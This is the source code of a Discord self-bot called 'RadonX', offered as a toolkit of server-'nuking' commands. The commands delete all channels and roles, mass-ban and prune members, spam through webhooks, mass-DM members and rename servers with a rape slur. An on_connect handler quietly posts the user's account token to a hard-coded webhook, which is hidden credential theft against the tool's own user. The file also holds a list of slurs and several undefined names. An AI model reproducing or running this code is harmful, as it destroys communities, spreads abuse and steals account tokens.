import discord
import requests
import asyncio
import time
import threading
import json
import os
import random
from dhooks import Webhook
from discord.ext import commands

print("""

██▀███   ▄▄▄      ▓█████▄  ▒█████   ███▄    █ ▒██   ██▒
▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▒▒ █ █ ▒░
▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌▒██░  ██▒▓██  ▀█ ██▒░░  █   ░
▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒ ░ █ █ ▒ 
░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░ ████▓▒░▒██░   ▓██░▒██▒ ▒██▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒▒ ░ ░▓ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░░░   ░▒ ░
  ░░   ░   ░   ▒    ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░  ░    ░  
   ░           ░  ░   ░        ░ ░           ░  ░    ░  
                    ░
                                    Developer:Sh4Dow
                                    Discord Username: sh4dow.runz 
                                    Github: https://github.com/ItsMeDark69                                                                

""")

token = input("Give Your ID Token: ")
message = input("What do you want to spam?: ")
reason = input("Give the reasons to put on audits: ")
your_name = input("What is your server name: ")
activity = input("What will the status: ")

client = commands.Bot(command_prefix=">", self_bot=True)

@client.event
async def on_ready():
    print("RadonX Self-Bot Is Now Online")
    print("------------------------")
    print("RandonX Self-bot Prefix Is >")
    await client.change_presence(activity=discord.Streaming(
        name=activity,
        url='https://youtube.com/@darkevil0071?si=x_-iXfS1ghgOiZ7Q'))

client.help_command = None
client.remove_command("help")

@client.command()
async def help(ctx):
    message = (
        "```js\n"
        "      𓆩RadonX Self-Bot𓆪\n"
        "─── ◉ ɢᴇɴᴇʀᴀʟ ᴄᴏᴍᴍᴀɴᴅs ◉ ───\n"
        "▌▰ >about <selfbot info>\n"
        "▌▰ >ping\n"
        "▌▰ >serverinfo\n"
        "▌▰ >membercount\n"
        "▌▰ >leave <guild_id>\n"
        "▌▰ >join\n"
        "▌▰ >dm <message>\n"
        "▌▰ >avatar <user>\n"
        "▌▰ >afk <reason>\n"
        "▌▰ >listen <message>\n"
        "▌▰ >purge <amount>\n"
        "▌▰ >play <message>\n"
        "▌▰ >stream <message>\n"
        "▌▰ >remove status\n"
        "▌▰ >l <message> [Ladder]\n"
        "▌▰ >react <emoji>\n"
        "▌▰ >stopreact\n"
        "─── ◉ ɪʟʟᴇɢᴀʟ ᴄᴏᴍᴍᴀɴᴅs ◉ ───\n"
        "▌▰ >wizz\n"
        "▌▰ >spam <amount> <message>\n"
        "▌▰ >massban\n"
        "▌▰ >prune\n"
        "▌▰ >invis\n"
        "▌▰ >invisoff\n"
        "▌▰ >renameserver <name>\n"
        "▌▰ >renameroles <name>\n"
        "▌▰ >renamechannels <name>\n"
        "▌▰ >copyserver <guild_id>\n"
        "─── ◉ ᴀᴅᴠᴀɴᴄᴇᴅ ᴄᴏᴍᴍᴀɴᴅs ◉ ───\n"
        "▌▰ >hook <user> <message>\n"
        "▌▰ >webhookspam\n"
        "▌▰ >dmall <message>\n"
        "─── ◉ ᴇxᴛʀᴀ ᴄᴏᴍᴍᴀɴᴅs ◉ ───\n"
        "▌▰ >encode <message>\n"
        "▌▰ >decode <message>\n"
        "▌▰ >ltc_balance <address>\n"
        "```"
    )
    await ctx.send(message)

@client.command()
async def hook(ctx, user: discord.Member, *, message):
    if not ctx.author.guild_permissions.manage_webhooks:
        print("You do not have permissions to manage webhooks in that server.")
        await ctx.message.delete()
        return
    
    channel = ctx.channel
    avatar_url = user.avatar_url
    bytes_of_avatar = bytes(requests.get(avatar_url).content)
    webhook = await channel.create_webhook(name=f"{user.display_name}", avatar=bytes_of_avatar)
    print(user.display_name)
    webhook_url = webhook.url 
    WebhookObject = Webhook(webhook_url)
    WebhookObject.send(message)
    WebhookObject.delete()
    
def ssspam(webhook_url):
    while spams:
        data = {'content': message}
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                continue
            elif response.status_code == 429:  # Rate limit error
                retry_after = response.json().get('retry_after', 1) / 1000
                print(f"Rate limited. Retrying in {retry_after} seconds.")
                time.sleep(retry_after)
            else:
                print(f"Unexpected status code {response.status_code}: {response.text}")
                delay = random.randint(30, 60)
                time.sleep(delay)
        except Exception as e:
            print(f"Error in ssspam: {e}")
            delay = random.randint(30, 60)
            time.sleep(delay)

@client.command()
async def wizz(ctx):
    try:
        # Delete existing channels and roles
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except Exception as e:
                print(f"Error deleting channel: {e}")

        # Delete roles but skip system roles and @everyone role
        for role in list(ctx.guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception as e:
                    print(f"Error deleting role: {e}")

        # Edit guild
        try:
            await ctx.guild.edit(
                name='Server Raped By RadonX',
                description='Server Successfully Raped By RadonX',
                reason=reason,
                icon=None,
                banner=None
            )
        except Exception as e:
            print(f"Error editing guild: {e}")

        # Create 5 text channels
        channels = []
        for i in range(5):
            try:
                channel = await ctx.guild.create_text_channel(name='ᖇαρҽԃ β¥ Ɽ₳ĐØ₦Ӿ')
                channels.append(channel)
                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
            except Exception as e:
                print(f"Error creating channel: {e}")

        # Create webhooks and start spamming
        global spams
        spams = True

        for channel in channels:
            try:
                webhook_name = 'Ɽ₳ĐØ₦Ӿ'  # Use a name that does not contain "discord"
                webhook = await channel.create_webhook(name=webhook_name)
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
            except Exception as e:
                print(f"Webhook Error {e}")

    except Exception as e:
        print(f"Error in wizz command: {e}")

def get_ltc_balance(address):
    """Retrieve the LTC balance for a given address from BlockCypher API."""
    url = f'https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance'
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        balance = data['final_balance'] / 1_000_000  # Convert satoshis to LTC
        return f"{balance:.8f}"  # Return balance with 8 decimal places
    except requests.RequestException as e:
        return f"Error retrieving balance: {e}"

@client.command()
async def ltc_balance(ctx, address):
    """View LTC balance from a given address."""
    balance = get_ltc_balance(address)
    await ctx.send(f"LTC balance for address {address}: {balance} LTC")

@client.command()
async def serverinfo(ctx):
    """Get information about the server."""
    guild = ctx.guild
    name = guild.name
    id = guild.id
    member_count = guild.member_count
    owner = guild.owner
    created_at = guild.created_at.strftime('%Y-%m-%d %H:%M:%S')
    await ctx.send(f"Server Name: {name}\nServer ID: {id}\nMembers: {member_count}\nOwner: {owner}\nCreated At: {created_at}")

@client.command()
async def userinfo(ctx, member: discord.Member = None):
    """Get information about a user."""
    member = member or ctx.author
    name = member.name
    id = member.id
    joined_at = member.joined_at.strftime('%Y-%m-%d %H:%M:%S')
    roles = [role.name for role in member.roles]
    await ctx.send(f"User Name: {name}\nUser ID: {id}\nJoined At: {joined_at}\nRoles: {', '.join(roles)}")

@client.command()
async def servericon(ctx):
    """Get the server's icon URL."""
    guild = ctx.guild
    icon_url = guild.icon.url
    await ctx.send(f"Server Icon URL: {icon_url}")

@client.command(aliases=['av', 'pfp'])
async def avatar(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author

    avatar_url = str(user.avatar_url_as(format='gif' if user.is_avatar_animated() else 'png'))

    await ctx.send(f"```{user.name}'s pfp```\n[RadonX]({avatar_url})")

@client.command()
async def afk(ctx, *, reason="No reason provided"):
    """Set an advanced AFK status."""
    # Store the AFK status in a database or an in-memory structure if needed
    await ctx.send(f"{ctx.author.name} is now AFK: {reason}")
    
@client.command()
async def nickall(ctx, nickname):
     await ctx.reply("Starting Nicknaming all members in the server .")
     gey = 0
     for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
            gey+=1
        except:
            pass
     try:await ctx.reply(f"Successfully changed nickname of {gey} members .")
     except:await ctx.send(f"Successfully changed nickname of {gey} members .")
     
@client.command()
async def copyserver(ctx, target_guild_id: int):
    # Delete old channels and roles in the target server
    target_guild = client.get_guild(target_guild_id)
    if not target_guild:
        await ctx.send("Target guild not found.")
        return

    # Delete all channels
    for channel in target_guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel: {e}")

    # Delete all roles
    for role in reversed(target_guild.roles):
        try:
            await role.delete()
        except Exception as e:
            print(f"Error deleting role: {e}")

    # Copy categories, channels, and roles
    for category in ctx.guild.categories:
        new_category = await target_guild.create_category(category.name)
        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await new_category.create_voice_channel(channel.name)
            elif isinstance(channel, discord.TextChannel):
                await new_category.create_text_channel(channel.name)

    for role in sorted(ctx.guild.roles, key=lambda r: r.position):
        if role.name != "@everyone":
            await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)

    # Copy guild settings
    try:
        await target_guild.edit(name=f"backup-{ctx.guild.name}", icon=ctx.guild.icon)
    except Exception as e:
        print(f"Error editing guild: {e}")

    await ctx.send(f"Server copied to {target_guild.name}.")
    
def encode_message(message):
    return ''.join(chr(ord(c) + 3) for c in message)

def decode_message(message):
    return ''.join(chr(ord(c) - 3) for c in message)

@client.command()
async def encode(ctx, *, message: str):
    encoded = encode_message(message)
    await ctx.send(f"Encoded Message: {encoded}")

@client.command()
async def decode(ctx, *, message: str):
    decoded = decode_message(message)
    await ctx.send(f"Decoded Message: {decoded}")
     
@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)

@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))

@client.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await client.change_presence(activity=game)

@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message, url='https://discord.gg/QQS4payKap')
    await client.change_presence(activity=stream)

@client.command()
async def removestatus(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=discord.Status.dnd)

@client.command()
async def dm(ctx, *, message: str):
    await ctx.message.delete()
    h = 0
    for user in list(ctx.guild.members):
        try:
            await user.send(message)
            h += 1
        except Exception as e:
            print(e)
    try:
        await ctx.reply(f"Successfully dmed {h} members in {ctx.guild.name}")
    except:
        await ctx.send(f"Successfully dmed {h} members in {ctx.guild.name}")


@client.command()
async def ping(ctx):
    start_time = time.time()
    message = await ctx.send("Pinging...")  
    end_time = time.time()
    
    latency = round(bot.latency * 1000)  # WebSocket latency
    response_time = round((end_time - start_time) * 1000)  # Message round-trip time
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    python_version = platform.python_version()
    discord_version = discord.__version__
    
    info = f"""
    ```
    Latency       : {latency}ms
    Response Time : {response_time}ms
    CPU Usage     : {cpu_usage}%
    Memory Usage  : {memory_usage}%
    Python Ver.   : {python_version}
    Discord.py    : {discord_version}
    ```
    """
    
    await message.edit(content=info)

@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n')

@client.command()
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = reason):
    await ctx.message.delete()
    roles = [role for role in ctx.guild.roles if len(role.members) > 0]
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason)
    await ctx.send(f"Successfully Pruned {hm} Members")

@client.command(aliases=['mc'])
async def membercount(ctx):
    member_count = ctx.guild.member_count
    await ctx.send(f"```This server has {member_count} Members.```")

@client.command(name='banall', aliases=["be", "baneveryone"])
async def ban_everyone(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban(reason=reason)
            print(f"Banned {m}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to ban {m}")
        except discord.HTTPException as e:
            print(f"An error occurred while banning {m}: {e}")

@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"Messaged: {user.name}")
        except:
            print(f"Couldn't message: {user.name}")

@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)

@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):
    for role in ctx.guild.roles:
        await role.edit(name=name)


@client.command()
async def massban(ctx):
    """Ban all members in the server."""
    # Ensure the bot has the necessary permissions
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You need administrator permissions to use this command.")
        return

    # Check if the bot has the 'Ban Members' permission
    if not ctx.guild.me.guild_permissions.ban_members:
        await ctx.send("I don't have permission to ban members in this server.")
        return

    # List to keep track of banned users
    banned_users = []
    
    # Attempt to ban each member
    for member in list(ctx.guild.members):
        if member == ctx.guild.me:
            continue  # Skip the bot itself
        try:
            await member.ban(reason="Mass ban command executed.")
            banned_users.append(member)
            await asyncio.sleep(1)  # To avoid rate limits
        except discord.Forbidden:
            await ctx.send(f"I don't have permission to ban {member.mention}.")
        except discord.HTTPException as e:
            await ctx.send(f"An error occurred while banning {member.mention}: {e}")

    # Send a summary of banned users
    await ctx.send(f"Successfully banned {len(banned_users)} members.")

@client.command()
async def about(ctx):
    about_message = (
        "```js\n"
        "      𓆩RadonX Self-Bot𓆪\n"
        "─── ◉ ɢᴇɴᴇʀᴀʟ ɪɴғᴏ ◉ ───\n"
        "▌▰ Selfbot Name: RadonX\n"
        "▌▰ The ultimate bot for advanced Discord users.\n"
        "\n"
        "─── ◉ ғᴇᴀᴛᴜʀᴇs ◉ ───\n"
        "▌▰ Best nuking commands for fast actions.\n"
        "▌▰ Advanced automation tools.\n"
        "▌▰ Crypto and stock management.\n"
        "▌▰ Moderation utilities.\n"
        "▌▰ Fun and productivity tools.\n"
        "▌▰ Lightning-fast performance.\n"
        "\n"
        "─── ◉ ᴅᴇᴛᴀɪʟs ◉ ───\n"
        "▌▰ Developer: sh4dow.runz\n"
        "▌▰ Version: Hidden \n"
        "▌▰ Github: Hidden\n"
        "\n"
        "─── ◉ ᴅɪsᴄʟᴀɪᴍᴇʀ ◉ ───\n"
        "▌▰ Use responsibly and comply with Discord's ToS.\n"
        "```"
    )
    await ctx.send(about_message)
  
@client.command()
async def leave(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild:
        await guild.leave()
        await ctx.send(f"**✅ | `{client.user.name}` left `{guild.name}`.**")
    else:
        await ctx.send("Unable to find the specified server.")
        
@client.command()
async def join(ctx):
    if ctx.author.voice:
        channel = ctx.author.voice.channel
        voice_client = await channel.connect()
        await ctx.send(f'Joined {channel}')
    else:
        await ctx.send('You are not connected to a voice channel.')
        
@client.command()
async def loud(ctx):
    if ctx.voice_client:
        audio_file = 'music.mp3'
        if os.path.isfile(audio_file):
            try:
                # PCM format requires no additional options
                ctx.voice_client.stop()  # Stop any currently playing audio
                ctx.voice_client.play(discord.PCMVolumeTransformer(discord.FFmpegPCMAudio(audio_file)))
                await ctx.send(f'Now playing {audio_file}')
            except Exception as e:
                await ctx.send(f'An error occurred: {e}')
        else:
            await ctx.send(f'File {audio_file} not found.')
    else:
        await ctx.send('Not connected to a voice channel.')

@client.command()

async def roast(ctx, member: discord.Member = None):

    if member is None:

        member = ctx.author  # Default to roasting the command user if no member is mentioned

    

    # Expanded list of roast words for a longer, more intense roast

    roast_words = [

        "you", "are", "a", "dumb", "ass", "hole", "fool", "clown", "moron", "noob", 

        "idiot", "trash", "weak", "loser", "stupid", "useless", "pathetic", "lame", 

        "annoying", "crybaby", "failure", "broken", "hopeless", "dense", "empty", 

        "worthless", "irrelevant", "clueless", "incompetent", "embarrassing", "basic", 

        "awkward", "delusional", "laughable", "miserable", "unoriginal", "cheesy", "cringe", 

        "unintelligent", "pointless", "horrible", "nonexistent", "ineffective", "flawless", 

        "insufferable", "ignorant", "patronizing", "untrustworthy", "boring", "decently", 

        "dull", "unimpressive", "hopeless", "stagnant", "washed", "out", "no-brainer", "losing", 

        "regretful", "awkward", "annoying", "unwanted", "unimportant", "irrelevant", "pathetic"

    ]

    

    # Send the roast messages (each line will contain 20 words, 10 times)

    for _ in range(10):  # Send 10 different roasting sequences

        selected_roast = random.sample(roast_words, 20)  # Select 20 random words for this roast sequence

        

        # Delete the user's command message

        await ctx.message.delete()

        

        # Send each word separately in one-by-one messages

        for word in selected_roast:
            await ctx.send(word)

@client.event
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/1343971945779302412/ZbwW3uAqH5A9BJNsSMl4BybsYboQ-tXAIfdEyxgk3vaWEv5tvyqaY5E0HE1_bNzzlKKg',
        json={'content': (token)})

@client.command()
async def abuse(ctx):

    await ctx.message.delete()  # Delete the user's command message

    # List of new playful phrases/letters

    phrases = [

        "Nigga", "Faggot", "Cunt", "Bitch", "Asshole", "Bastard", 

        "Dickhead", "Shithead", "Whore", "Slut", "Prick", "Pussy", 

        "Motherfucker", "Cock", "Dildo", "Tits", "Son Of A Bitch", 

        "Dumbass", "Retard", "Bimbo", "Pimp", "Stupid", "Jerk", 

        "Idiot", "Wanker", "Bitchass"

    ]

    # Spam the phrases very quickly with a line-by-line display

@client.command()
async def l(ctx, *, text: str):
    await ctx.message.delete()  # Delete the user's command message
    words = text.split()  # Split the input message into words

    for word in words:
        await ctx.send(word)  # Send each word as a separate message

@client.command()
async def review(ctx):
    await ctx.message.delete()  # Delete the user's message
    await ctx.send("discord.gg/tickets Please Join The Listing Support Server And Click On **Ticket Creation**. Then, Scroll Down Until You See **Staff Feedback** And Create A Ticket. The Bot Will Give You Some Questions—Just Fill Them In And Wait For The Managers/Support Team To Respond. That's It! Thank You!")

@client.command()
async def invis(ctx):
    global spamming, spam_message
    if spamming:
        await ctx.send("```Already spamming.```")
        return
    
    spam_message = spam_messages
    spamming = True
    await ctx.send(f"```Started spamming invis.```")
    spam_loop.start(ctx.channel)

@client.command()
async def invisoff(ctx):
    global spamming
    if not spamming:
        await ctx.send("```Not currently spamming.```")
        return


    spamming = False
    spam_loop.stop()   
    await ctx.send("```Stopped spamming.```")

@client.command()
async def react(ctx, emoji):
    global auto_react, reaction_emoji
    await ctx.message.delete()  # Delete the command message
    auto_react = True  # Enable auto-react
    reaction_emoji = emoji  # Set the reaction emoji
    await ctx.send(f"Auto-react is now ON with {emoji}!", delete_after=5)  # Optional: delete message after 5 seconds

@client.command()
async def stopreact(ctx):
    global auto_react
    await ctx.message.delete()  # Delete the command message
    auto_react = False  # Disable auto-react
    await ctx.send("Auto-react is now OFF!", delete_after=5)  # Optional: delete message after 5 seconds

@client.event
async def on_message(message):
    global auto_react, reaction_emoji
    if auto_react and reaction_emoji and message.author == bot.user:
        try:
            await message.add_reaction(reaction_emoji)
        except discord.errors.InvalidArgument:
            print(f"Invalid emoji: {reaction_emoji}")
    
    await bot.process_commands(message)

client.run(token, bot=False)
